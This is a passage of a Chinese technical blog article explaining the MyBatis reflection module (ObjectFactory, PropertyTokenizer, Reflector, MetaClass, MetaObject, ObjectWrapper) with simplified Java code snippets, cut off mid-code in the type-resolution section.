<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6636ebdeed249508aba2ef5c1473b58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767860147&amp;x-signature=wynRxnrBAA8PRsBAWyWwY31mXLo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">2.1 反射模块组成</h2>
<h2 data-id="heading-8">Reflection（反射模块）</h2>
<h2 data-id="heading-9">├── ObjectFactory（对象工厂）</h2>
<h2 data-id="heading-10">├── PropertyTokenizer（属性分词器）</h2>
<h2 data-id="heading-11">├── PropertyCopier（属性复制器）</h2>
<h2 data-id="heading-12">├── Reflector（反射器）</h2>
<h2 data-id="heading-13">├── MetaClass（元数据类）</h2>
<h2 data-id="heading-14">├── MetaObject（元对象）</h2>
<h2 data-id="heading-15">└── SystemMetaObject（系统元对象）</h2>
<h2 data-id="heading-16">2.2 ObjectFactory - 对象工厂</h2>
<p>ObjectFactory负责创建对象实例，定义了简单而强大的接口：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ObjectFactory</span> {
    <span class="hljs-comment">// 创建对象实例</span>
    &lt;T&gt; T <span class="hljs-title function_">create</span>(<span class="hljs-title class_">Class</span>&lt;T&gt; <span class="hljs-keyword">type</span>);

    <span class="hljs-comment">// 创建对象实例（带构造参数）</span>
    &lt;T&gt; T <span class="hljs-title function_">create</span>(<span class="hljs-title class_">Class</span>&lt;T&gt; <span class="hljs-keyword">type</span>, 
                 <span class="hljs-title class_">Class</span>&lt;?&gt;[] classes, 
                 <span class="hljs-title class_">Object</span>[] values);

    <span class="hljs-comment">// 判断是否为集合类型</span>
    &lt;T&gt; <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isCollection</span>(<span class="hljs-title class_">Class</span>&lt;T&gt; <span class="hljs-keyword">type</span>);
}
</code></pre>
<p>默认实现DefaultObjectFactory核心代码：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultObjectFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">create</span>(<span class="hljs-params">Class&lt;T&gt; <span class="hljs-keyword">type</span></span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">type</span>.<span class="hljs-title function_">newInstance</span>();
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Error creating instance of "</span> + <span class="hljs-keyword">type</span>, e);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">create</span>(<span class="hljs-params">Class&lt;T&gt; <span class="hljs-keyword">type</span>, 
                        Class&lt;?&gt;[] classes, 
                        <span class="hljs-built_in">Object</span>[] values</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 查找匹配的构造器</span>
            <span class="hljs-title class_">Constructor</span>&lt;?&gt; constructor = 
                <span class="hljs-keyword">type</span>.<span class="hljs-title function_">getDeclaredConstructor</span>(classes);
            constructor.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);
            <span class="hljs-keyword">return</span> (T) constructor.<span class="hljs-title function_">newInstance</span>(values);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-comment">// 处理异常...</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">create</span>(<span class="hljs-keyword">type</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isCollection</span>(<span class="hljs-params">Class&lt;T&gt; <span class="hljs-keyword">type</span></span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Collection</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(<span class="hljs-keyword">type</span>) 
               || <span class="hljs-keyword">type</span>.<span class="hljs-title function_">isArray</span>();
    }
}
</code></pre>
<h2 data-id="heading-17">2.3 PropertyTokenizer - 属性分词器</h2>
<p>PropertyTokenizer用于解析复杂的属性表达式，比如user.address.city</p>
<p>核心代码：</p>
<pre><code class="hljs language-ini" lang="ini">public class PropertyTokenizer 
    implements Iterator&lt;PropertyTokenizer&gt; {

    private String fullname<span class="hljs-comment">;      // 完整属性表达式</span>
    private String name<span class="hljs-comment">;          // 当前名称</span>
    private String indexedName<span class="hljs-comment">;   // 索引名称</span>
    private String index<span class="hljs-comment">;         // 索引值</span>
    private String children<span class="hljs-comment">;      // 子属性</span>

    public PropertyTokenizer(String fullname) {
        <span class="hljs-attr">this.fullname</span> = fullname<span class="hljs-comment">;</span>

        // 解析属性表达式
        int <span class="hljs-attr">delim</span> = fullname.indexOf(<span class="hljs-string">'.'</span>)<span class="hljs-comment">;</span>
        if (delim &gt; -1) {
            <span class="hljs-attr">name</span> = fullname.substring(<span class="hljs-number">0</span>, delim)<span class="hljs-comment">;</span>
            <span class="hljs-attr">children</span> = fullname.substring(delim + <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
        } else {
            <span class="hljs-attr">name</span> = fullname<span class="hljs-comment">;</span>
            <span class="hljs-attr">children</span> = null<span class="hljs-comment">;</span>
        }

        <span class="hljs-attr">indexedName</span> = name<span class="hljs-comment">;</span>
        // 解析索引 例如：list<span class="hljs-section">[0]</span>
        <span class="hljs-attr">delim</span> = name.indexOf(<span class="hljs-string">'['</span>)<span class="hljs-comment">;</span>
        if (delim &gt; -1) {
            <span class="hljs-attr">index</span> = name.substring(delim + <span class="hljs-number">1</span>, 
                                   name.length() - 1)<span class="hljs-comment">;</span>
            <span class="hljs-attr">name</span> = name.substring(<span class="hljs-number">0</span>, delim)<span class="hljs-comment">;</span>
        }
    }

    @Override
    public boolean hasNext() {
        return children != null<span class="hljs-comment">;</span>
    }

    @Override
    public PropertyTokenizer next() {
        return new PropertyTokenizer(children)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>使用示例：</p>
<pre><code class="hljs language-ini" lang="ini">String <span class="hljs-attr">expression</span> = <span class="hljs-string">"user.address.city"</span><span class="hljs-comment">;</span>
PropertyTokenizer <span class="hljs-attr">tokenizer</span> = 
    new PropertyTokenizer(expression)<span class="hljs-comment">;</span>

while (tokenizer.hasNext()) {
    System.out.println(
        "Current: " + tokenizer.getName())<span class="hljs-comment">;</span>
    <span class="hljs-attr">tokenizer</span> = tokenizer.next()<span class="hljs-comment">;</span>
}

// 输出：
// Current: user
// Current: address
// Current: city
</code></pre>
<h2 data-id="heading-18">2.4 PropertyCopier - 属性复制器</h2>
<p>PropertyCopier用于在对象间复制属性：</p>
<pre><code class="hljs language-scss" lang="scss">public class PropertyCopier {
    public void <span class="hljs-built_in">copyProperties</span>(Object source, 
                               Object target) {
        <span class="hljs-comment">// 获取元数据</span>
        MetaClass sourceMetaClass = 
            MetaClass<span class="hljs-selector-class">.forClass</span>(source.getClass());
        MetaClass targetMetaClass = 
            MetaClass<span class="hljs-selector-class">.forClass</span>(target.getClass());

        <span class="hljs-comment">// 获取源对象的所有属性</span>
        String<span class="hljs-selector-attr">[]</span> getterNames = 
            sourceMetaClass<span class="hljs-selector-class">.getGetterNames</span>();

        for (String name : getterNames) {
            <span class="hljs-comment">// 检查目标对象是否有对应的setter</span>
            if (targetMetaClass.hasSetter(name)) {
                try {
                    <span class="hljs-comment">// 复制属性值</span>
                    <span class="hljs-selector-tag">Object</span> value = sourceMetaClass
                        <span class="hljs-selector-class">.getGetter</span>(name)
                        <span class="hljs-selector-class">.invoke</span>(source);
                    targetMetaClass
                        <span class="hljs-selector-class">.getSetter</span>(name)
                        <span class="hljs-selector-class">.invoke</span>(target, value);
                } catch (Exception e) {
                    <span class="hljs-comment">// 忽略无法复制的属性</span>
                }
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-19">三、对象属性访问</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02b6519c6b144f80a12dce8476fae287~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767860147&amp;x-signature=9H%2Fqcsq4ekcmQcrzpZ2kBS9Hnz4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">3.1 Reflector - 反射器</h2>
<p>Reflector是反射模块的<strong>核心类</strong>，用于缓存类的反射信息。</p>
<p>核心结构：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflector</span> {
    <span class="hljs-comment">// 类类型</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span>&lt;?&gt; type;

    <span class="hljs-comment">// 可读属性映射：属性名 -&gt; getter方法</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Invoker</span>&gt; getMethods 
        <span class="hljs-operator">=</span> new <span class="hljs-type">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 可写属性映射：属性名 -&gt; setter方法</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Invoker</span>&gt; setMethods 
        <span class="hljs-operator">=</span> new <span class="hljs-type">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 属性类型映射</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Class</span>&lt;?&gt;&gt; getTypes 
        <span class="hljs-operator">=</span> new <span class="hljs-type">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Class</span>&lt;?&gt;&gt; setTypes 
        <span class="hljs-operator">=</span> new <span class="hljs-type">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 所有属性名</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; properties 
        <span class="hljs-operator">=</span> new <span class="hljs-type">HashSet</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-type">Reflector</span>(<span class="hljs-type">Class</span>&lt;?&gt; clazz) {
        this.type <span class="hljs-operator">=</span> clazz;
        addDefaultConstructor(clazz);
        addGetMethods(clazz);
        addSetMethods(clazz);
        addFields(clazz);
    }
}
</code></pre>
<p>添加getter方法的核心逻辑：</p>
<pre><code class="hljs language-scss" lang="scss">private void <span class="hljs-built_in">addGetMethods</span>(Class&lt;?&gt; clazz) {
    Method<span class="hljs-selector-attr">[]</span> methods = clazz<span class="hljs-selector-class">.getDeclaredMethods</span>();

    for (Method method : methods) {
        <span class="hljs-comment">// 处理getXxx()方法</span>
        if (method.getName()<span class="hljs-selector-class">.startsWith</span>("get") 
            &amp;&amp; method<span class="hljs-selector-class">.getParameterTypes</span>()<span class="hljs-selector-class">.length</span> == <span class="hljs-number">0</span>) {

            String name = method<span class="hljs-selector-class">.getName</span>()<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">3</span>);
            name = Character<span class="hljs-selector-class">.toLowerCase</span>(name.charAt(<span class="hljs-number">0</span>)) 
                   + name<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">1</span>);
            <span class="hljs-built_in">addGetMethod</span>(name, method);
        } 
        <span class="hljs-comment">// 处理isXxx()方法</span>
        else if (method.getName()<span class="hljs-selector-class">.startsWith</span>("is") 
            &amp;&amp; method<span class="hljs-selector-class">.getParameterTypes</span>()<span class="hljs-selector-class">.length</span> == <span class="hljs-number">0</span>
            &amp;&amp; method<span class="hljs-selector-class">.getReturnType</span>() == boolean<span class="hljs-selector-class">.class</span>) {

            String name = method<span class="hljs-selector-class">.getName</span>()<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">2</span>);
            name = Character<span class="hljs-selector-class">.toLowerCase</span>(name.charAt(<span class="hljs-number">0</span>)) 
                   + name<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">1</span>);
            <span class="hljs-built_in">addGetMethod</span>(name, method);
        }
    }
}
</code></pre>
<h2 data-id="heading-21">3.2 MetaClass - 元数据类</h2>
<p>MetaClass对Reflector进行了封装，提供更友好的API：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaClass</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Reflector</span> reflector;

    <span class="hljs-comment">// 获取属性值</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name, <span class="hljs-built_in">Object</span> obj</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Invoker</span> method = 
                reflector.<span class="hljs-title function_">getGetInvoker</span>(name);
            <span class="hljs-keyword">return</span> method.<span class="hljs-title function_">invoke</span>(obj);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Error getting property '"</span> + name + <span class="hljs-string">"'"</span>, e);
        }
    }

    <span class="hljs-comment">// 设置属性值</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name, 
                        <span class="hljs-built_in">Object</span> obj, 
                        <span class="hljs-built_in">Object</span> value</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Invoker</span> method = 
                reflector.<span class="hljs-title function_">getSetInvoker</span>(name);
            method.<span class="hljs-title function_">invoke</span>(obj, value);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Error setting property '"</span> + name + <span class="hljs-string">"'"</span>, e);
        }
    }

    <span class="hljs-comment">// 获取属性类型</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Class</span>&lt;?&gt; <span class="hljs-title function_">getGetterType</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) {
        <span class="hljs-keyword">return</span> reflector.<span class="hljs-title function_">getGetterType</span>(name);
    }

    <span class="hljs-comment">// 是否有getter/setter</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">hasGetter</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) {
        <span class="hljs-keyword">return</span> reflector.<span class="hljs-title function_">hasGetter</span>(name);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">hasSetter</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) {
        <span class="hljs-keyword">return</span> reflector.<span class="hljs-title function_">hasSetter</span>(name);
    }
}
</code></pre>
<h2 data-id="heading-22">3.3 MetaObject - 元对象</h2>
<p>MetaObject是元数据的<strong>门面类</strong>，提供了最友好的API：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaObject</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Object</span> originalObject;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">MetaClass</span> metaClass;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">ObjectWrapper</span> objectWrapper;

    <span class="hljs-comment">// 获取属性值（支持嵌套属性）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) {
        <span class="hljs-title class_">PropertyTokenizer</span> prop = 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyTokenizer</span>(name);

        <span class="hljs-keyword">if</span> (prop.<span class="hljs-title function_">hasNext</span>()) {
            <span class="hljs-comment">// 处理嵌套属性</span>
            <span class="hljs-keyword">return</span> metaClass.<span class="hljs-title function_">getValue</span>(
                prop.<span class="hljs-title function_">getName</span>(), originalObject);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> objectWrapper.<span class="hljs-title function_">get</span>(prop);
        }
    }

    <span class="hljs-comment">// 设置属性值（支持嵌套属性）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name, <span class="hljs-built_in">Object</span> value</span>) {
        <span class="hljs-title class_">PropertyTokenizer</span> prop = 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyTokenizer</span>(name);

        <span class="hljs-keyword">if</span> (prop.<span class="hljs-title function_">hasNext</span>()) {
            metaClass.<span class="hljs-title function_">setValue</span>(
                prop.<span class="hljs-title function_">getName</span>(), originalObject, value);
        } <span class="hljs-keyword">else</span> {
            objectWrapper.<span class="hljs-title function_">set</span>(prop, value);
        }
    }

    <span class="hljs-comment">// 创建MetaObject</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">MetaObject</span> <span class="hljs-title function_">forObject</span>(<span class="hljs-params">
        <span class="hljs-built_in">Object</span> <span class="hljs-built_in">object</span>,
        ObjectFactory objectFactory,
        ObjectWrapperFactory objectWrapperFactory</span>) {

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">object</span> == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">SystemMetaObject</span>.<span class="hljs-property">NULL_META_OBJECT</span>;
        }

        <span class="hljs-comment">// 根据对象类型创建不同的MetaObject</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">object</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Map</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapMetaObject</span>(
                (<span class="hljs-title class_">Map</span>) <span class="hljs-built_in">object</span>, 
                objectFactory, 
                objectWrapperFactory);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">object</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Collection</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CollectionMetaObject</span>(
                (<span class="hljs-title class_">Collection</span>) <span class="hljs-built_in">object</span>,
                objectFactory,
                objectWrapperFactory);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanMetaObject</span>(
                <span class="hljs-built_in">object</span>,
                objectFactory,
                objectWrapperFactory);
        }
    }
}
</code></pre>
<h2 data-id="heading-23">四、对象实例化</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d997b194e8ef43599484f510ef30588e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767860147&amp;x-signature=VfF2y%2B9XT6MBsRRHG496NkI%2B1GQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-24">4.1 ObjectFactory创建对象</h2>
<pre><code class="hljs language-ini" lang="ini">ObjectFactory <span class="hljs-attr">objectFactory</span> = 
    new DefaultObjectFactory()<span class="hljs-comment">;</span>

// 创建简单对象
User <span class="hljs-attr">user</span> = objectFactory.create(User.class)<span class="hljs-comment">;</span>

// 创建带参对象
Class&lt;?&gt;<span class="hljs-section">[]</span> <span class="hljs-attr">classes</span> = {String.class, String.class}<span class="hljs-comment">;</span>
Object<span class="hljs-section">[]</span> <span class="hljs-attr">values</span> = {<span class="hljs-string">"张三"</span>, <span class="hljs-string">"zhangsan@example.com"</span>}<span class="hljs-comment">;</span>
User <span class="hljs-attr">user</span> = objectFactory.create(
    User.class, classes, values)<span class="hljs-comment">;</span>

// 创建集合
List&lt;User&gt; <span class="hljs-attr">users</span> = 
    objectFactory.create(ArrayList.class)<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-25">4.2 处理特殊类型</h2>
<p>扩展ObjectFactory处理接口和抽象类：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomObjectFactory</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">DefaultObjectFactory</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">create</span>(<span class="hljs-params">Class&lt;T&gt; <span class="hljs-keyword">type</span></span>) {
        <span class="hljs-comment">// 处理接口类型</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span>.<span class="hljs-title function_">isInterface</span>()) {
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span>.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">List</span>.<span class="hljs-property">class</span>)) {
                <span class="hljs-keyword">return</span> (T) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span>.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Map</span>.<span class="hljs-property">class</span>)) {
                <span class="hljs-keyword">return</span> (T) <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            }
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Cannot create instance of interface: "</span> 
                + <span class="hljs-keyword">type</span>);
        }

        <span class="hljs-comment">// 处理抽象类</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isAbstract</span>(<span class="hljs-keyword">type</span>.<span class="hljs-title function_">getModifiers</span>())) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Cannot create instance of abstract class: "</span>
                + <span class="hljs-keyword">type</span>);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">create</span>(<span class="hljs-keyword">type</span>);
    }
}
</code></pre>
<h2 data-id="heading-26">4.3 对象包装器 - ObjectWrapper</h2>
<p>ObjectWrapper提供统一的属性访问接口：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> interface ObjectWrapper {
    <span class="hljs-comment">// 获取属性值</span>
    <span class="hljs-function">Object <span class="hljs-title">get</span><span class="hljs-params">(PropertyTokenizer prop)</span></span>;

    <span class="hljs-comment">// 设置属性值</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">set</span><span class="hljs-params">(PropertyTokenizer prop, Object value)</span></span>;

    <span class="hljs-comment">// 获取属性类型</span>
    <span class="hljs-function">Class&lt;?&gt; <span class="hljs-title">getSetterType</span><span class="hljs-params">(<span class="hljs-type">String</span> name)</span></span>;

    <span class="hljs-comment">// 是否有setter/getter</span>
    <span class="hljs-function"><span class="hljs-type">boolean</span> <span class="hljs-title">hasSetter</span><span class="hljs-params">(<span class="hljs-type">String</span> name)</span></span>;
    <span class="hljs-function"><span class="hljs-type">boolean</span> <span class="hljs-title">hasGetter</span><span class="hljs-params">(<span class="hljs-type">String</span> name)</span></span>;
}
</code></pre>
<p>BeanWrapper实现示例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">BaseWrapper</span> 
    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectWrapper</span> {

    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Object</span> <span class="hljs-built_in">object</span>;
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">MetaClass</span> metaClass;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">PropertyTokenizer prop</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Invoker</span> method = metaClass.<span class="hljs-title function_">getGetInvoker</span>(
                prop.<span class="hljs-title function_">getName</span>());
            <span class="hljs-title class_">Object</span> value = method.<span class="hljs-title function_">invoke</span>(<span class="hljs-built_in">object</span>);

            <span class="hljs-keyword">if</span> (prop.<span class="hljs-title function_">hasNext</span>() &amp;&amp; value != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// 递归获取嵌套属性</span>
                <span class="hljs-keyword">return</span> <span class="hljs-title class_">MetaObject</span>
                    .<span class="hljs-title function_">forObject</span>(value, ...)
                    .<span class="hljs-title function_">getValue</span>(prop.<span class="hljs-title function_">getChildren</span>());
            }
            <span class="hljs-keyword">return</span> value;
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Throwable</span> t) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Error getting property '"</span> 
                + prop.<span class="hljs-title function_">getName</span>() + <span class="hljs-string">"'"</span>, t);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">PropertyTokenizer prop, 
                    <span class="hljs-built_in">Object</span> value</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (prop.<span class="hljs-title function_">hasNext</span>()) {
                <span class="hljs-comment">// 处理嵌套属性</span>
                <span class="hljs-title class_">Object</span> child = <span class="hljs-title function_">get</span>(prop);
                <span class="hljs-keyword">if</span> (child == <span class="hljs-literal">null</span>) {
                    child = <span class="hljs-title function_">instantiatePropertyValue</span>(
                        prop.<span class="hljs-title function_">getName</span>(), 
                        prop.<span class="hljs-title function_">getChildren</span>());
                    <span class="hljs-title function_">set</span>(prop, child);
                }
                <span class="hljs-title class_">MetaObject</span>
                    .<span class="hljs-title function_">forObject</span>(child, ...)
                    .<span class="hljs-title function_">setValue</span>(prop.<span class="hljs-title function_">getChildren</span>(), value);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-title class_">Invoker</span> method = metaClass.<span class="hljs-title function_">getSetInvoker</span>(
                    prop.<span class="hljs-title function_">getName</span>());
                method.<span class="hljs-title function_">invoke</span>(<span class="hljs-built_in">object</span>, value);
            }
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Throwable</span> t) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Error setting property '"</span> 
                + prop.<span class="hljs-title function_">getName</span>() + <span class="hljs-string">"'"</span>, t);
        }
    }
}
</code></pre>
<h2 data-id="heading-27">五、类型解析</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5aa9e300f1994ca68df3816a59850e53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767860147&amp;x-signature=sXhJko66fsu6u4tjyMmF9i99%2Bok%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-28">5.1 TypeParameterResolver - 泛型解析</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeParameterResolverImpl</span> 
    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeParameterResolver</span> {

    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Type</span> <span class="hljs-keyword">type</span>;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Type</span> <span class="hljs-title function_">resolveType</span>(<span class="hljs-params">Type rawType, Type jniType</span>) {
        <span class="hljs-comment">// 解析泛型类型</span>
        <span class="hljs-keyword">if</span> (rawType <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Class</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolveClass</span>((<span class="hljs-title class_">Class</span>&lt;?&gt;) rawType);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rawType <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ParameterizedType</span>) {
